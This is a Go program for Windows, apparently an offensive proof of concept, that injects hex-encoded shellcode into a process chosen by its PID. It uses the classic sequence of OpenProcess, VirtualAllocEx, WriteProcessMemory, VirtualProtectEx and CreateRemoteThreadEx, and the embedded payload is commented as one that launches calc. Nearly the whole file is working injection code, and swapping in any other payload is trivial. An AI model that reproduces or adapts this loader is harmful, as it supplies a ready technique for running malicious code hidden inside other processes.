// +build windows
package main


import (

	
	"unsafe"
	"log"
	"encoding/hex"
	"flag"
	"fmt"
	
	"golang.org/x/sys/windows"
 

)

func main() {
 	pid := flag.Int("pid", 0, "Proc")
	flag.Parse() 



	kernel32DLL	:= windows.NewLazySystemDLL("kernel32.dll")

	WriteProcessMemory := kernel32DLL.NewProc("WriteProcessMemory")
	VirtualAllocEx := kernel32DLL.NewProc("VirtualAllocEx")
	VirtualProtectEx := kernel32DLL.NewProc("VirtualProtectEx")
	CreateRemoteThreadEx := kernel32DLL.NewProc("CreateRemoteThreadEx")


	// Get a handle on remote process
	pHandle, errProc := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, false, uint32(*pid))
	if errProc != nil {
		log.Fatal(fmt.Sprintf("[!]Error calling OpenProcess:\r\n%s", errProc.Error()))
	}
	//fmt.Println(fmt.Sprintf("[+] Successfully got a handle to process %d", *pid))

	// Pop Calc (32 bit payload)
	//"505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3"

	buf, bufErr := hex.DecodeString("505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3")
	if bufErr != nil {

		log.Fatal(fmt.Sprintf("[!]there was an error decoding the string to a hex byte array: %s", bufErr.Error()))

	}
	//fmt.Println("[+] Successfully decoded payload")

	// Get a pointer to the cave of code carved out in the remote process
	pRemoteCode, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(pHandle), 0, uintptr(len(buf)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", errVirtualAlloc.Error()))
	}
	//fmt.Println(fmt.Sprintf("[+] Successfully allocated a region of memory in remote process %d", *pid))

	// Write the payload into the code cave
	_, _, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(pHandle), pRemoteCode, (uintptr)(unsafe.Pointer(&buf[0])), uintptr(len(buf)))

	if errWriteProcessMemory != nil && errWriteProcessMemory.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling WriteProcessMemory:\r\n%s", errWriteProcessMemory.Error()))
	}
	//fmt.Println(fmt.Sprintf("[+] Wrote the payload to process %d", *pid))


	oldProtect := windows.PAGE_READWRITE
	_, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(pHandle), pRemoteCode, uintptr(len(buf)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if errVirtualProtectEx != nil && errVirtualProtectEx.Error() != "The operation completed successfully." {
		fmt.Printf("[!] Error on VirtualProtect:", errVirtualProtectEx, "\n")
	}
	//fmt.Println(fmt.Sprintf("[+] Successfully changed permissions to PAGE_EXECUTE_READ in PID %d", *pid))



	 _, _, errCreate := CreateRemoteThreadEx.Call(uintptr(pHandle), 0, 0, pRemoteCode, 0, 0, 0)
	 	if errCreate != nil {
		fmt.Sprintf("[!] Error on CreateRemoteThread:", errCreate, "\n")
	}
	//fmt.Println("[+] Creating remote thread to execute shellcode")

	
	errCloseHandle := windows.CloseHandle(pHandle)
	if errCloseHandle != nil {
		fmt.Printf("[!] Error on CLoseHandle:", errCloseHandle, "\n")

	}
	//fmt.Println(fmt.Sprintf("[+] Closed handle on the processe %d", *pid))

}
